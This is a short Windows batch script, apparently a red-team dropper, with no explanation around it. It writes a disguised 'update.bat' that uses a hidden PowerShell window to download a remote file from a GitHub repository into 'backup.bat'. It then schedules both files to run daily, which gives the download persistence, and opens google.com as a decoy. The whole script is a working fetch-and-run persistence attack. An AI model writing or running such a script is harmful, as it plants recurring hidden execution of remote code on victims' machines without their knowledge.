echo @echo off > "%LOCALAPPDATA%"\update.bat
echo start /min cmd /c PowerShell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/radiusmk/redteam/raw/main/regsvr32.txt' -OutFile '%LOCALAPPDATA%\backup.bat'" >> "%LOCALAPPDATA%"\update.bat
echo N | SCHTASKS /Create /SC DAILY /TN "MyTasks\1" /TR ""%LOCALAPPDATA%"\update.bat" /ST 15:00 /RU "%USERNAME%"

echo N | SCHTASKS /Create /SC DAILY /TN "MyTasks\2" /TR ""%LOCALAPPDATA%"\backup.bat" /ST 15:01 /RU "%USERNAME%"

cls
start https://google.com/
